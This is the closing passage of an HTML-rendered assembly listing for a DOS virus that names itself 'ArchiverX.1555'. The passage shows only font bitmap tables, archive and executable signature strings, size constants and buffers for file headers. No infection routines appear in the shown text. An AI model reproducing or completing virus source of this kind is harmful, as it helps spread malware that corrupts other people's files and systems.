        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">

</span><span class="sc5">Font3Ofs</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">Font3</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">

</span><span class="sc5">Font4</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00111100b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01000010b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01011010b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01011010b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01000010b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00111100b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00111100b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01000010b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01011010b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01011010b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01000010b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00111100b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">

</span><span class="sc5">Font4Ofs</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">Font4</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">










</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                                ДАННЫЕ</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">VirName</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'ArchiverX.1555 -- Copyright (c) by DJ Sadovnikov'</span><span class="sc0">
</span><span class="sc5">Arhivat</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'PKARRAHA'</span><span class="sc0">
</span><span class="sc5">NewEXE</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'NEPELELX'</span><span class="sc0">

</span><span class="sc5">CodeSize</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Virus</span><span class="sc0">

</span><span class="sc5">Flag2</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Temp</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CurPos</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FSize</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Header</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">MemSize</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Virus</span><span class="sc0">

</span><span class="sc5">Code</span><span class="sc0">        </span><span class="sc9">ends</span><span class="sc0">
        </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">Virus</span><span class="sc0">
</span></div></body>
</html>
